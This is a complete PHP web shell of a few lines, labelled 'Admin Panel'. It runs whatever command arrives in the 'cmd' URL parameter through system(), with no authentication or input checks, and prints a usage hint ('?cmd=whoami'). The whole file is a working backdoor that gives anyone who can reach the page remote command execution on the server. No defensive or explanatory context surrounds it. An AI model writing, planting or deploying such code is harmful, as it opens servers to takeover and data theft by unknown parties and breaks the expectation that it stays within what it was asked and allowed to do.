<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "<h3>Admin Panel</h3>";
    echo "<p>Usage: ?cmd=whoami</p>";
}
?>
